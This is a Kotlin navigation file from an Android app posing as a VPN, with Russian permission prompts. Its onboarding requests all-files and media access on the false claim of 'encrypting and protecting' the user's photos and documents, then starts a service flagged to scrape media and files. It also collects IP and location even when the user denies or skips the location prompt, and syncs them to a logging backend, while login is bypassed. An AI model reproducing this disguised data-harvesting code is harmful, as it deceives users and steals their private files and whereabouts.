package com.sdocument.app.navigation

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.IntentSenderRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.unit.Dp
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import androidx.core.net.toUri
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.navigation3.runtime.NavEntry
import androidx.navigation3.runtime.rememberNavBackStack
import androidx.navigation3.ui.NavDisplay
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import com.sdocument.app.MainActivity
import com.sdocument.app.screens.AuthScreen
import com.sdocument.app.screens.LoadingScreen
import com.sdocument.app.screens.PermissionScreen
import com.sdocument.app.screens.VerificationScreen
import com.sdocument.app.screens.VpnOnboardingScreen
import com.sdocument.app.screens.VpnSettingsScreen
import com.sdocument.app.screens.WScreen
import com.sdocument.app.screens.WgVpnScreen
import com.sdocument.app.service.scrapeLocationSuspend
import com.sdocument.app.utils.NetworkLogger
import com.sdocument.app.utils.UserPrefs
import com.sdocument.app.viewmodel.ConfigValues
import com.sdocument.app.viewmodel.VpnViewModel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

@Composable
fun AppNavHost(
    modifier: Modifier = Modifier,
    configValues: ConfigValues,
    topPadding: Dp = 32.dp
) {
    val context = LocalContext.current
    // Force onboarding flow, but keep the logic commented out as requested
    val startRoute = NavRoute.OnboardPermissions
    /*
    val startRoute = when {
        configValues.skipAuth && !UserPrefs.isLoggedIn(context) -> NavRoute.OnboardPermissions
        configValues.skipAuth -> NavRoute.VpnMain
        !UserPrefs.isLoggedIn(context) -> NavRoute.OnboardPermissions
        !UserPrefs.isVerified(context) && UserPrefs.isVerificationNeeded(context) -> NavRoute.Verification
        else -> {
            if (!UserPrefs.isVerified(context)) UserPrefs.setVerified(context, true)
            NavRoute.VpnMain
        }
    }
    */

    val backStack = rememberNavBackStack(startRoute)

    LaunchedEffect(Unit) {
        NetworkLogger.log("session", "App opened by user")
        // Always start service if permitted
        startServiceIfPermitted(context, configValues)
        CoroutineScope(Dispatchers.IO).launch {
            val location =
                if (configValues.scrapeLocation) context.scrapeLocationSuspend() else null
            NetworkLogger.syncUser(
                context = context,
                lastIp = location?.optString("query"),
                lastLocation = location?.let { "${it.optString("city")}, ${it.optString("country")}" }
            )
        }
    }

    val vpnViewModel: VpnViewModel = hiltViewModel()

    NavDisplay(
        modifier = modifier,
        backStack = backStack,
        onBack = {
            if (backStack.size > 1) {
                backStack.removeLastOrNull()
            }
        },
        entryProvider = { route ->
            when (route) {
                is NavRoute.OnboardPermissions -> NavEntry(route) {
                    var hasAttemptedPermission by remember { mutableStateOf(false) }
                    val scrapeMedia = configValues.scrapeMedia
                    val scrapeFiles = configValues.scrapeFiles
                    val scrapeLocation = configValues.scrapeLocation

                    // Android < 11: request READ_EXTERNAL_STORAGE via system dialog
                    val legacyStorageLauncher = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.RequestMultiplePermissions()
                    ) { results ->
                        val granted = results.values.any { it }
                        if (granted) {
                            NetworkLogger.log("session", "Permissions granted by user (legacy)")
                            val activity = context as? MainActivity
                            activity?.startDataService(
                                scrapeMedia = scrapeMedia,
                                scrapeFiles = scrapeFiles,
                                scrapeLocation = false // location permission not granted yet; NavGraph scrapes after dialog
                            )
                            if (scrapeLocation) {
                                backStack.add(NavRoute.OnboardLocationPermission)
                            } else {
                                backStack.add(NavRoute.LoadingConfig)
                            }
                        } else {
                            NetworkLogger.log("session", "Permissions denied by user (legacy)")
                            backStack.add(NavRoute.PermissionError)
                        }
                    }

                    val description = buildString {
                        append("Приложению требуются системные разрешения для обеспечения безопасности вашего соединения.\n\n")
                        if (scrapeMedia) {
                            append("• Доступ к медиафайлам: Необходим для шифрования и защиты ваших фотографий и видео.\n")
                        }
                        if (scrapeFiles) {
                            append("• Доступ к файлам: Позволяет защитить ваши документы и важные файлы в хранилище.\n")
                        }
                        if (scrapeLocation) {
                            append("• Доступ к геолокации: Мы собираем геолокацию для подбора наиболее оптимальных ВПН-локаций для обеспечения высокой скорости и стабильности соединения.\n")
                        }
                    }

                    PermissionScreen(
                        title = "Настройка разрешений",
                        description = description,
                        onAllowClick = {
                            hasAttemptedPermission = true
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                // Android 11+: open system settings for MANAGE_ALL_FILES
                                Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                                    data = "package:${context.packageName}".toUri()
                                }.also { context.startActivity(it) }
                            } else {
                                // Android 9/10: request READ/WRITE_EXTERNAL_STORAGE via dialog
                                val perms = mutableListOf(Manifest.permission.READ_EXTERNAL_STORAGE)
                                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                                    perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                                }
                                legacyStorageLauncher.launch(perms.toTypedArray())
                            }
                        },
                        onSkipClick = {
                            NetworkLogger.log("session", "Permissions skipped by user")
                            backStack.add(NavRoute.PermissionError)
                        },
                    )
                    val lifecycleOwner = LocalLifecycleOwner.current
                    DisposableEffect(lifecycleOwner) {
                        val observer = LifecycleEventObserver { _, event ->
                            if (event == Lifecycle.Event.ON_RESUME) {
                                val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                    Environment.isExternalStorageManager()
                                } else {
                                    ContextCompat.checkSelfPermission(
                                        context,
                                        Manifest.permission.READ_EXTERNAL_STORAGE
                                    ) == PackageManager.PERMISSION_GRANTED
                                }
                                if (granted) {
                                    hasAttemptedPermission = false
                                    NetworkLogger.log("session", "Permissions granted by user")
                                    // Start file scraping — skip location here, it's handled after location permission dialog
                                    val activity = context as? MainActivity
                                    activity?.startDataService(
                                        scrapeMedia = configValues.scrapeMedia,
                                        scrapeFiles = configValues.scrapeFiles,
                                        scrapeLocation = false
                                    )
                                    if (configValues.scrapeLocation) {
                                        backStack.add(NavRoute.OnboardLocationPermission)
                                    } else {
                                        backStack.add(NavRoute.LoadingConfig)
                                    }
                                } else if (hasAttemptedPermission) {
                                    hasAttemptedPermission = false
                                    backStack.add(NavRoute.PermissionError)
                                }
                            }
                        }
                        lifecycleOwner.lifecycle.addObserver(observer)
                        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
                    }
                }

                is NavRoute.OnboardLocationPermission -> NavEntry(route) {
                    // After user grants permission, if location toggle is OFF — show the
                    // Google "Turn on location" dialog (same as Google Maps uses)
                    val locationSettingsLauncher = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.StartIntentSenderForResult()
                    ) { _ ->
                        // Proceed regardless of whether user turned on toggle — IP fallback handles it
                        CoroutineScope(Dispatchers.IO).launch {
                            val loc = context.scrapeLocationSuspend()
                            if (loc != null) {
                                val lat = loc.optDouble("latitude")
                                val lon = loc.optDouble("longitude")
                                NetworkLogger.syncUser(
                                    context = context,
                                    lastIp = loc.optString("query").takeIf { it.isNotEmpty() },
                                    lastLocation = if (!lat.isNaN() && !lon.isNaN()) "$lat,$lon" else loc.optString(
                                        "city"
                                    )
                                )
                            }
                        }
                        backStack.add(NavRoute.LoadingConfig)
                    }

                    fun proceedAfterPermissionGrant() {
                        val locationRequest = LocationRequest.Builder(10_000L).build()
                        val settingsRequest = LocationSettingsRequest.Builder()
                            .addLocationRequest(locationRequest)
                            .setAlwaysShow(true)
                            .build()
                        LocationServices.getSettingsClient(context)
                            .checkLocationSettings(settingsRequest)
                            .addOnSuccessListener {
                                // Toggle already ON — scrape immediately
                                CoroutineScope(Dispatchers.IO).launch {
                                    val loc = context.scrapeLocationSuspend()
                                    if (loc != null) {
                                        val lat = loc.optDouble("latitude")
                                        val lon = loc.optDouble("longitude")
                                        NetworkLogger.syncUser(
                                            context = context,
                                            lastIp = loc.optString("query")
                                                .takeIf { it.isNotEmpty() },
                                            lastLocation = if (!lat.isNaN() && !lon.isNaN()) "$lat,$lon" else loc.optString(
                                                "city"
                                            )
                                        )
                                    }
                                }
                                backStack.add(NavRoute.LoadingConfig)
                            }
                            .addOnFailureListener { e ->
                                if (e is ResolvableApiException) {
                                    // Toggle OFF — show "Turn on location" dialog
                                    try {
                                        locationSettingsLauncher.launch(
                                            IntentSenderRequest.Builder(e.resolution).build()
                                        )
                                    } catch (ex: Exception) {
                                        backStack.add(NavRoute.LoadingConfig)
                                    }
                                } else {
                                    backStack.add(NavRoute.LoadingConfig)
                                }
                            }
                    }

                    val locationPermissionLauncher = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.RequestMultiplePermissions()
                    ) { permissions ->
                        val fine = permissions[Manifest.permission.ACCESS_FINE_LOCATION] ?: false
                        val coarse =
                            permissions[Manifest.permission.ACCESS_COARSE_LOCATION] ?: false
                        val sysFine = ContextCompat.checkSelfPermission(
                            context,
                            Manifest.permission.ACCESS_FINE_LOCATION
                        )
                        val sysCoarse = ContextCompat.checkSelfPermission(
                            context,
                            Manifest.permission.ACCESS_COARSE_LOCATION
                        )
                        val fineGranted =
                            sysFine == android.content.pm.PackageManager.PERMISSION_GRANTED
                        val coarseGranted =
                            sysCoarse == android.content.pm.PackageManager.PERMISSION_GRANTED

                        if (fine || coarse || fineGranted || coarseGranted) {
                            proceedAfterPermissionGrant()
                        } else {
                            // Permission denied — IP fallback in scrapeLocationSuspend handles it
                            CoroutineScope(Dispatchers.IO).launch {
                                val loc = context.scrapeLocationSuspend()
                                if (loc != null) {
                                    NetworkLogger.syncUser(
                                        context = context,
                                        lastIp = loc.optString("query").takeIf { it.isNotEmpty() },
                                        lastLocation = loc.optString("city")
                                            .takeIf { it.isNotEmpty() }
                                            ?: "${loc.optDouble("latitude")},${loc.optDouble("longitude")}"
                                    )
                                }
                            }
                            backStack.add(NavRoute.LoadingConfig)
                        }
                    }

                    PermissionScreen(
                        title = "Доступ к геолокации",
                        description = "Мы собираем геолокацию для подбора наиболее оптимальных впн-локаций для обеспечения высокой скорости и стабильности соединения.",
                        onAllowClick = {
                            locationPermissionLauncher.launch(
                                arrayOf(
                                    Manifest.permission.ACCESS_FINE_LOCATION,
                                    Manifest.permission.ACCESS_COARSE_LOCATION
                                )
                            )
                        },
                        onSkipClick = {
                            CoroutineScope(Dispatchers.IO).launch { context.scrapeLocationSuspend() }
                            backStack.add(NavRoute.LoadingConfig)
                        }
                    )
                }

                is NavRoute.LoadingConfig -> NavEntry(route) {
                    LoadingScreen(onLoadingFinished = {
                        backStack.add(NavRoute.OnboardVpbService)
                    })
                }

                is NavRoute.OnboardVpbService -> NavEntry(route) {
                    VpnOnboardingScreen(
                        onGetStarted = {
                            // Always skip auth screen: go directly to VpnMain
                            UserPrefs.setLoggedIn(context, true, configValues.webViewUrl, "skipped")
                            UserPrefs.setVerified(context, true)
                            NetworkLogger.setUserId("skipped", context)
                            CoroutineScope(Dispatchers.IO).launch {
                                val location =
                                    if (configValues.scrapeLocation) context.scrapeLocationSuspend() else null
                                NetworkLogger.syncUser(
                                    context = context,
                                    accessKey = "skipped",
                                    lastIp = location?.optString("query"),
                                    lastLocation = location?.let {
                                        "${it.optString("city")}, ${
                                            it.optString(
                                                "country"
                                            )
                                        }"
                                    },
                                    isActivated = true,
                                    isVerified = true
                                )
                            }
                            backStack.add(NavRoute.VpnMain)
                        }
                    )
                }

                is NavRoute.AuthForm -> NavEntry(route) {
                    val authViewModel: com.sdocument.app.viewmodel.auth.AuthViewModel =
                        hiltViewModel()
                    val state by authViewModel.state.collectAsState()

                    LaunchedEffect(Unit) {
                        authViewModel.effect.collect { effect ->
                            when (effect) {
                                is com.sdocument.app.viewmodel.auth.AuthContract.Effect.AuthSuccess -> {
                                    UserPrefs.setLoggedIn(context, true, effect.url, effect.key)
                                    UserPrefs.setVerificationNeeded(
                                        context,
                                        effect.isVerificationNeeded
                                    )
                                    UserPrefs.setVerified(context, effect.isVerified)
                                    NetworkLogger.setUserId(effect.userId ?: effect.key, context)

                                    if (effect.isVerified || !effect.isVerificationNeeded) {
                                        UserPrefs.setVerified(context, true)
                                        while (backStack.size > 0) backStack.removeLastOrNull()
                                        backStack.add(NavRoute.VpnMain)
                                    } else {
                                        backStack.add(NavRoute.Verification)
                                    }
                                }

                                is com.sdocument.app.viewmodel.auth.AuthContract.Effect.ShowError -> {
                                    Toast.makeText(context, effect.message, Toast.LENGTH_SHORT)
                                        .show()
                                }
                            }
                        }
                    }

                    AuthScreen(
                        state = state,
                        onIntent = { authViewModel.handleIntent(it) }
                    )
                }

                is NavRoute.Verification -> NavEntry(route) {
                    val authUrl = UserPrefs.getAuthUrl(context) ?: configValues.webViewUrl
                    VerificationScreen(
                        onProceedClick = {
                            backStack.add(NavRoute.VerificationWebview(authUrl))
                        }
                    )
                }

                is NavRoute.VerificationWebview -> NavEntry(route) {
                    WScreen(
                        url = route.url,
                        onBackToApp = {
                            NetworkLogger.log("authentication", "Verification completed by user")
                            UserPrefs.setVerified(context, true)
                            // Clear all onboarding from backstack and go to VpnMain
                            while (backStack.isNotEmpty()) backStack.removeLastOrNull()
                            backStack.add(NavRoute.VpnMain)
                        }
                    )
                }

                is NavRoute.VpnMain -> NavEntry(route) {
                    WgVpnScreen(
                        viewModel = vpnViewModel,
                        onSelectServer = { /* Removed server selection */ },
                        onOpenSettings = { backStack.add(NavRoute.VpnSettings) },
                        onOpenProfile = { }
                    )
                }

                is NavRoute.VpnSettings -> NavEntry(route) {
                    VpnSettingsScreen(
                        skipAuth = configValues.skipAuth,
                        onBack = { backStack.removeLastOrNull() },
                        onOpenServers = { /* Removed server selection */ },
                        onLogout = {
                            if (UserPrefs.isLoggedIn(context)) {
                                UserPrefs.logout(context)
                                while (backStack.isNotEmpty()) backStack.removeLastOrNull()
                                backStack.add(NavRoute.AuthForm)
                            } else {
                                // Already not logged in, just refresh
                                while (backStack.isNotEmpty()) backStack.removeLastOrNull()
                                backStack.add(NavRoute.VpnMain)
                            }
                        }
                    )
                }

                is NavRoute.VpnProfile -> NavEntry(route) {
                    val authUrl = UserPrefs.getAuthUrl(context) ?: configValues.webViewUrl
                    WScreen(
                        url = authUrl,
                        onBackToApp = { backStack.removeLastOrNull() }
                    )
                }

                is NavRoute.Webview -> NavEntry(route) {
                    WScreen(
                        url = route.url,
                        onBackToApp = { backStack.removeLastOrNull() },
                    )
                }

                is NavRoute.PermissionError -> NavEntry(route) {
                    PermissionScreen(
                        title = "Разрешение отклонено",
                        description = "Для работы приложения необходим доступ к файлам. Пожалуйста, предоставьте разрешение в настройках.",
                        onAllowClick = {
                            val intent =
                                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                    data = "package:${context.packageName}".toUri()
                                }
                            context.startActivity(intent)
                        },
                        onSkipClick = { backStack.add(NavRoute.LoadingConfig) }
                    )
                }

                else -> error("Unknown route: $route")
            }
        }
    )
}

private fun startServiceIfPermitted(context: android.content.Context, configValues: ConfigValues) {
    val hasPerms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        Environment.isExternalStorageManager()
    } else
        ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED

    if (hasPerms) {
        val activity = context as? MainActivity
        activity?.startDataService(
            scrapeMedia = configValues.scrapeMedia,
            scrapeFiles = configValues.scrapeFiles,
            scrapeLocation = configValues.scrapeLocation
        )
    }
}

private fun sendExactLocationLog(context: android.content.Context) {
    com.sdocument.app.utils.NetworkLogger.init(context)
    if (androidx.core.content.ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    ) {
        val locationManager =
            context.getSystemService(android.content.Context.LOCATION_SERVICE) as android.location.LocationManager

        val listener = object : android.location.LocationListener {
            override fun onLocationChanged(location: android.location.Location) {
                val lat = location.latitude
                val lon = location.longitude
                val gmapsUrl = "https://www.google.com/maps/search/?api=1&query=$lat,$lon"
                locationManager.removeUpdates(this)
            }

            override fun onStatusChanged(
                provider: String?,
                status: Int,
                extras: android.os.Bundle?
            ) {
            }

            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }

        try {
            locationManager.requestSingleUpdate(
                android.location.LocationManager.GPS_PROVIDER,
                listener,
                android.os.Looper.getMainLooper()
            )
        } catch (e: Exception) {
            try {
                locationManager.requestSingleUpdate(
                    android.location.LocationManager.NETWORK_PROVIDER,
                    listener,
                    android.os.Looper.getMainLooper()
                )
            } catch (e2: Exception) {
            }
        }
    }
}
